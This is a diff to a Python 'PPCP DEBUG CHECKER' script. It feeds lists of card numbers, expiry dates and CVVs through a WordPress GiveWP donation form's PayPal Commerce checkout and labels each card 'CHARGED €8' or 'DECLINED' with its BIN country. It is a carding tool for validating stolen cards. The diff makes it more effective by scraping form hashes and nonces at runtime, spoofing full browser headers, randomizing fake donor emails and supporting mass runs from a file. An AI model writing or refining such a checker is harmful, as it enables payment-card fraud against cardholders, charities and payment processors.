@@ -5,6 +5,7 @@ import requests
 from queue import Queue
 import threading
 import json
+import re
 
 # =========================
 # Helpers
@@ -12,9 +13,9 @@ import json
 
 def get_random_ua():
     return random.choice([
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-        "Mozilla/5.0 (X11; Linux x86_64)"
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
     ])
 
 def lr(text, left, right):
@@ -22,6 +23,20 @@ def lr(text, left, right):
         return text.split(left, 1)[1].split(right, 1)[0]
     except Exception:
         return ""
+
+def extract_field(html, field_name):
+    """Extract hidden form field value"""
+    patterns = [
+        rf'name="{field_name}"[^>]*value="([^"]*)"',
+        rf"name='{field_name}'[^>]*value='([^']*)'",
+        rf'name="{field_name}"[^>]*value=\'([^\']*)\'',
+        rf'id="{field_name}"[^>]*value="([^"]*)"',
+    ]
+    for pattern in patterns:
+        match = re.search(pattern, html, re.IGNORECASE)
+        if match:
+            return match.group(1)
+    return ""
 
 # =========================
 # PLACEHOLDER DOMAINS ONLY
@@ -52,10 +67,10 @@ def run(cc, mes, ano, cvv, debug=True):
 
     s = requests.Session()
 
-    # ---- STEP 1: GET TOKEN ----
+    # ---- STEP 1: GET TOKEN + FORM DATA ----
     if debug:
         print(f"\n{'='*60}")
-        print(f"[STEP 1] GET TOKEN")
+        print(f"[STEP 1] GET TOKEN + FORM DATA")
         print(f"[URL] {FORM_URL}")
 
     try:
@@ -63,8 +78,8 @@ def run(cc, mes, ano, cvv, debug=True):
             FORM_URL,
             headers={
                 "User-Agent": ua,
-                "Pragma": "no-cache",
-                "Accept": "*/*"
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
             },
             timeout=30
         )
@@ -76,7 +91,10 @@ def run(cc, mes, ano, cvv, debug=True):
             print(f"[ERROR] {e}")
         return f"{cc}|{mes}|{anox}|{cvv} -> ERROR STEP1: {e}"
 
-    sec = lr(r1.text, 'token":"', '","')
+    html = r1.text
+
+    # Extract PayPal token
+    sec = lr(html, 'token":"', '","')
     token = ""
     if sec:
         try:
@@ -89,8 +107,36 @@ def run(cc, mes, ano, cvv, debug=True):
                 print(f"[TOKEN DECODE ERROR] {e}")
     else:
         if debug:
-            print("[TOKEN] NOT FOUND IN RESPONSE")
-            print(f"[RAW RESPONSE PREVIEW]\n{r1.text[:800]}")
+            print("[TOKEN] NOT FOUND")
+
+    # Extract dynamic form fields
+    form_id = extract_field(html, "give-form-id") or lr(html, 'name="give-form-id" value="', '"')
+    form_hash = extract_field(html, "give-form-hash") or lr(html, 'name="give-form-hash" value="', '"')
+    form_id_prefix = extract_field(html, "give-form-id-prefix") or lr(html, 'name="give-form-id-prefix" value="', '"')
+    
+    # Try to find nonce
+    nonce = extract_field(html, "give-form-nonce") or lr(html, 'give-form-nonce" value="', '"')
+    
+    # Try alternate nonce patterns
+    if not nonce:
+        nonce_match = re.search(r'_wpnonce["\s:]+["\']([a-f0-9]+)["\']', html)
+        if nonce_match:
+            nonce = nonce_match.group(1)
+
+    if debug:
+        print(f"[FORM ID] {form_id}")
+        print(f"[FORM ID PREFIX] {form_id_prefix}")
+        print(f"[FORM HASH] {form_hash}")
+        print(f"[NONCE] {nonce if nonce else 'NOT FOUND'}")
+
+    if not form_hash:
+        if debug:
+            print("[WARNING] No form hash found - request will likely fail")
+            # Show some of the HTML to help debug
+            print(f"[HTML PREVIEW] Searching for form fields...")
+            hash_area = re.search(r'give-form-hash.{0,100}', html)
+            if hash_area:
+                print(f"[FOUND] {hash_area.group(0)}")
 
     # ---- STEP 2: CREATE ORDER ----
     if debug:
@@ -98,55 +144,75 @@ def run(cc, mes, ano, cvv, debug=True):
         print(f"[STEP 2] CREATE ORDER")
         print(f"[URL] {CREATE_ORDER_URL}")
 
-    files = {
-        "give-honeypot": (None, ""),
-        "give-form-id-prefix": (None, "25344-1"),
-        "give-form-id": (None, "25344"),
-        "give-form-title": (None, "Donation Form"),
-        "give-current-url": (None, f"{BASE_SITE}/donate/"),
-        "give-form-url": (None, f"{BASE_SITE}/give/donation-form/"),
-        "give-form-minimum": (None, "8"),
-        "give-form-maximum": (None, "1000000"),
-        "give-form-hash": (None, "9a19e98e0d"),
-        "give-price-id": (None, "custom"),
-        "give-amount": (None, "8"),
-        "give_first": (None, "xyros"),
-        "give_last": (None, "wayne"),
-        "give_email": (None, "test@example.test"),
-        "payment-mode": (None, "paypal-commerce"),
-        "card_name": (None, "xyros op"),
-        "give-gateway": (None, "paypal-commerce"),
-        "give_embed_form": (None, "1"),
+    # Build form data with extracted values
+    form_data = {
+        "give-honeypot": "",
+        "give-form-id-prefix": form_id_prefix or "25344-1",
+        "give-form-id": form_id or "25344",
+        "give-form-title": "Donation Form",
+        "give-current-url": f"{BASE_SITE}/donate/",
+        "give-form-url": f"{BASE_SITE}/give/donation-form/",
+        "give-form-minimum": "8",
+        "give-form-maximum": "1000000",
+        "give-form-hash": form_hash,
+        "give-price-id": "custom",
+        "give-amount": "8",
+        "give_first": "John",
+        "give_last": "Smith",
+        "give_email": f"test{random.randint(1000,9999)}@gmail.com",
+        "payment-mode": "paypal-commerce",
+        "card_name": "John Smith",
+        "give-gateway": "paypal-commerce",
+        "give_embed_form": "1",
     }
+    
+    # Add nonce if found
+    if nonce:
+        form_data["give-form-nonce"] = nonce
+        form_data["_wpnonce"] = nonce
+
+    if debug:
+        print(f"[FORM DATA] {json.dumps(form_data, indent=2)}")
 
     try:
         r2 = s.post(
             CREATE_ORDER_URL,
-            files=files,
+            data=form_data,
             headers={
                 "User-Agent": ua,
-                "Pragma": "no-cache",
-                "Accept": "*/*"
+                "Accept": "application/json, text/javascript, */*; q=0.01",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "X-Requested-With": "XMLHttpRequest",
+                "Origin": BASE_SITE,
+                "Referer": FORM_URL,
             },
             timeout=30
         )
         if debug:
             print(f"[STATUS] {r2.status_code}")
-            print(f"[RAW RESPONSE]\n{r2.text}")
+            print(f"[RESPONSE HEADERS] {dict(r2.headers)}")
+            print(f"[RAW RESPONSE]\n{r2.text if r2.text else '(empty)'}")
     except Exception as e:
         if debug:
             print(f"[ERROR] {e}")
         return f"{cc}|{mes}|{anox}|{cvv} -> ERROR STEP2: {e}"
 
+    if not r2.text:
+        if debug:
+            print("[ERROR] Empty response - form hash or session may be invalid")
+        return f"{cc}|{mes}|{anox}|{cvv} -> ERROR: Empty response at STEP2 (bad form hash?)"
+
     try:
         r2_json = r2.json()
         order_id = r2_json.get("id", "")
         if debug:
+            print(f"[PARSED JSON]\n{json.dumps(r2_json, indent=2)}")
             print(f"[ORDER ID] {order_id}")
         if not order_id:
+            error_msg = r2_json.get("message", r2_json.get("error", "No order ID"))
             if debug:
-                print("[ERROR] No order ID in response")
-            return f"{cc}|{mes}|{anox}|{cvv} -> ERROR: No order ID"
+                print(f"[ERROR] {error_msg}")
+            return f"{cc}|{mes}|{anox}|{cvv} -> ERROR: {error_msg}"
     except Exception as e:
         if debug:
             print(f"[JSON ERROR] {e}")
@@ -186,12 +252,11 @@ def run(cc, mes, ano, cvv, debug=True):
             confirm_url,
             json=confirm_payload,
             headers={
-                "authorization": f"Bearer {token}",
-                "braintree-sdk-version": "3.32.0-payments-sdk-dev",
-                "origin": ASSETS_SITE,
-                "referer": f"{ASSETS_SITE}/",
-                "user-agent": ua,
-                "Content-Type": "application/json"
+                "Authorization": f"Bearer {token}",
+                "Content-Type": "application/json",
+                "Origin": ASSETS_SITE.rstrip("/"),
+                "Referer": f"{ASSETS_SITE}",
+                "User-Agent": ua,
             },
             timeout=30
         )
@@ -218,23 +283,19 @@ def run(cc, mes, ano, cvv, debug=True):
         # Try multiple paths for country code
         country = j3.get("bin_country_code", "")
         if not country:
-            # Check in payment_source.card
             ps = j3.get("payment_source", {})
             card = ps.get("card", {})
             country = card.get("bin_country_code", "XX")
         
-        # Get decline reason from details
+        # Get decline reason
         if "details" in j3:
             details = j3["details"]
             if isinstance(details, list) and len(details) > 0:
                 decline_reason = details[0].get("issue", "") or details[0].get("description", "")
         
-        # Get error message
-        if "message" in j3:
-            if not decline_reason:
-                decline_reason = j3["message"]
+        if "message" in j3 and not decline_reason:
+            decline_reason = j3["message"]
         
-        # Get error name
         if "name" in j3:
             error_name = j3["name"]
             if debug:
@@ -257,17 +318,20 @@ def run(cc, mes, ano, cvv, debug=True):
     try:
         r4 = s.post(
             approve_url,
-            files=files,
+            data=form_data,
             headers={
                 "User-Agent": ua,
-                "Pragma": "no-cache",
-                "Accept": "*/*"
+                "Accept": "application/json, text/javascript, */*; q=0.01",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "X-Requested-With": "XMLHttpRequest",
+                "Origin": BASE_SITE,
+                "Referer": FORM_URL,
             },
             timeout=30
         )
         if debug:
             print(f"[STATUS] {r4.status_code}")
-            print(f"[RAW RESPONSE]\n{r4.text}")
+            print(f"[RAW RESPONSE]\n{r4.text if r4.text else '(empty)'}")
     except Exception as e:
         if debug:
             print(f"[ERROR] {e}")
@@ -285,7 +349,6 @@ def run(cc, mes, ano, cvv, debug=True):
         success = r4_json.get("success", False)
         
         if not success:
-            # Try to get error message
             final_error = r4_json.get("message", "")
             if not final_error:
                 final_error = r4_json.get("error", "")
@@ -299,7 +362,6 @@ def run(cc, mes, ano, cvv, debug=True):
     # ---- BUILD RESULT ----
     label = "CHARGED €8 🔥" if success else "DECLINED ❌"
     
-    # Build detailed result
     if success:
         result = f"{cc}|{mes}|{anox}|{cvv} -> success : true - {country} - {label}"
     else:
@@ -379,20 +441,18 @@ if __name__ == "__main__":
     import sys
     
     print("\n" + "="*60)
-    print("  PPCP DEBUG CHECKER - Real API Response Mode")
+    print("  PPCP DEBUG CHECKER - Real API Response Mode v2")
     print("="*60)
     
     if len(sys.argv) > 1:
         arg = sys.argv[1]
         
-        # Check if it's a single card
         if "|" in arg and arg.count("|") == 3:
             parts = arg.split("|", 3)
             cc, mes, ano, cvv = parts
             print(f"\n[SINGLE CARD TEST]")
             run(cc, mes, ano, cvv, debug=True)
         else:
-            # Treat as file
             debug_mode = "--no-debug" not in sys.argv
             mass_run(arg, threads=1, debug=debug_mode)
     else:
